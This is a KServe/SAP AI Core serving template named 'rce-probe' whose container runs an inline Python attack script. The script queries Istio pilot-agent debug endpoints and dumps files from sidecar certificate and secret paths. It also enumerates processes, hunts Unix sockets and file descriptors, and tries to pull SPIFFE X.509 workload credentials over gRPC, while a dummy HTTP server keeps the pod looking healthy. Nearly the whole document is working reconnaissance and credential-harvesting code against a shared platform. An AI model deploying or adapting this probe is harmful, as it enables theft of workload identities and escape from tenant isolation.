apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "4.2.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "pilot-agent-certs-pprof-socket-hunt"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import os, socket, sys, subprocess, glob, stat

            print('[PROBE_V42_START]', flush=True)

            def http_get(host, port, path, timeout=5):
                try:
                    s = socket.socket()
                    s.settimeout(timeout)
                    s.connect((host, port))
                    s.sendall(f'GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n'.encode())
                    resp = b''
                    while True:
                        c = s.recv(8192)
                        if not c: break
                        resp += c
                        if len(resp) > 32000: break
                    s.close()
                    return resp.decode(errors='replace')
                except Exception as e:
                    return f'ERR:{e}'

            # --- 1. Full metrics from pilot-agent ---
            metrics = http_get('127.0.0.1', 15020, '/metrics')
            print('[PILOT_METRICS_FULL]', metrics[:8000], flush=True)

            # --- 2. Pilot-agent cert endpoints ---
            for path in ['/certs', '/debug/certs', '/debug/cert',
                         '/debug/certdump', '/debug/config',
                         '/debug/registryz', '/debug/endpointshardz',
                         '/debug/configz', '/debug/authenticationz',
                         '/debug/peerz', '/debug/pprof/goroutine',
                         '/istio-certs/', '/etc/certs/']:
                resp = http_get('127.0.0.1', 15020, path)
                if 'ERR:' not in resp and '404' not in resp:
                    print(f'[PILOT_HIT:{path}]', resp[:2000], flush=True)
                else:
                    print(f'[PILOT_MISS:{path}]', resp[:80], flush=True)

            # --- 3. Check /etc/certs/ and /var/lib/istio/data/ (sidecar cert paths) ---
            for p in ['/etc/certs/', '/var/lib/istio/', '/var/lib/istio/data/',
                      '/etc/istio/', '/etc/istio/proxy/',
                      '/var/run/secrets/workload-spiffe-uds/',
                      '/run/secrets/workload-spiffe-uds/',
                      '/tmp/spiffe-uds.sock',
                      '/var/run/secrets/istio/',
                      '/etc/istio/pod/',
                      '/etc/istio/config/']:
                try:
                    if os.path.isdir(p):
                        files = os.listdir(p)
                        print(f'[DIR:{p}]', files, flush=True)
                        for fn in files:
                            full = os.path.join(p, fn)
                            try:
                                with open(full, 'rb') as f:
                                    print(f'[FILE:{full}]', f.read(1000).decode(errors='replace')[:800], flush=True)
                            except: pass
                    elif os.path.exists(p):
                        st = os.stat(p)
                        print(f'[EXISTS:{p}] mode={oct(stat.S_IMODE(st.st_mode))} uid={st.st_uid}', flush=True)
                except Exception as e:
                    print(f'[PATH_ERR:{p}]', str(e)[:80], flush=True)

            # --- 4. List all processes in our PID namespace ---
            print('[PROCESSES]', flush=True)
            for pid in sorted(os.listdir('/proc')):
                if not pid.isdigit(): continue
                try:
                    with open(f'/proc/{pid}/cmdline', 'rb') as f:
                        cmd = f.read().replace(b'\x00', b' ').decode(errors='replace')[:200]
                    with open(f'/proc/{pid}/status') as f:
                        status_lines = f.read()
                    uid_line = [l for l in status_lines.split('\n') if l.startswith('Uid:')]
                    uid = uid_line[0] if uid_line else '?'
                    print(f'  PID {pid}: {cmd} | {uid}', flush=True)
                except: pass

            # --- 5. Hunt for Unix sockets accessible to us ---
            print('[SOCKET_HUNT]', flush=True)
            for pattern in ['/var/run/**/*.sock', '/var/run/**/*.socket',
                             '/run/**/*.sock', '/run/**/*.socket',
                             '/tmp/**/*.sock', '/tmp/**/*.socket',
                             '/etc/**/*.sock', '/etc/**/*.socket']:
                try:
                    hits = glob.glob(pattern, recursive=True)
                    for h in hits:
                        try:
                            st = os.stat(h)
                            print(f'[SOCK_FOUND:{h}] mode={oct(stat.S_IMODE(st.st_mode))} uid={st.st_uid}', flush=True)
                        except: pass
                except: pass

            # --- 6. FDs of all processes - look for SPIFFE socket inodes ---
            # Known inodes from /proc/net/unix: 31116, 31115, 31156, 31127
            target_inodes = {31116, 31115, 31156, 31127}
            for pid in sorted(os.listdir('/proc')):
                if not pid.isdigit(): continue
                fd_dir = f'/proc/{pid}/fd'
                try:
                    for fd in os.listdir(fd_dir):
                        try:
                            link = os.readlink(f'{fd_dir}/{fd}')
                            st = os.stat(f'{fd_dir}/{fd}')
                            if st.st_ino in target_inodes or 'socket' in link:
                                print(f'[FD_MATCH] pid={pid} fd={fd} -> {link} inode={st.st_ino}', flush=True)
                        except: pass
                except: pass

            # --- 7. Install grpcio with HOME=/tmp ---
            print('[PIP_INSTALL_V2] starting...', flush=True)
            env = os.environ.copy()
            env['HOME'] = '/tmp'
            r = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q', '--no-cache-dir',
                 '--target=/tmp/pylib', 'grpcio==1.62.0', 'cryptography'],
                env=env, capture_output=True, timeout=180)
            if r.returncode != 0:
                print('[PIP_ERR]', r.stderr.decode()[:500], flush=True)
            else:
                print('[PIP_OK]', flush=True)
                sys.path.insert(0, '/tmp/pylib')

            # --- 8. Try SPIFFE socket after pip (broader path search) ---
            try:
                import grpc

                def try_spiffe_socket(path):
                    try:
                        chan = grpc.insecure_channel(f'unix://{path}')
                        fetch = chan.unary_stream(
                            '/spiffe.workload.SpiffeWorkloadAPI/FetchX509SVID',
                            request_serializer=lambda x: x,
                            response_deserializer=lambda x: x)
                        for raw in fetch(b'', metadata=[('workload.spiffe.io','true')], timeout=4):
                            print(f'[SPIFFE_HIT:{path}] got response len={len(raw)}', flush=True)
                            return raw
                    except Exception as e:
                        print(f'[SPIFFE_MISS:{path}]', str(e)[:120], flush=True)
                    return None

                for sp in ['/var/run/secrets/workload-spiffe-uds/socket',
                            '/run/secrets/workload-spiffe-uds/socket',
                            '/tmp/spiffe-uds.sock',
                            '/var/run/secrets/istio/socket',
                            '/etc/istio/proxy/XDS']:
                    result = try_spiffe_socket(sp)
                    if result: break

            except ImportError as e:
                print('[GRPC_IMPORT_ERR]', e, flush=True)

            print('[PROBE_V42_DONE]', flush=True)
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
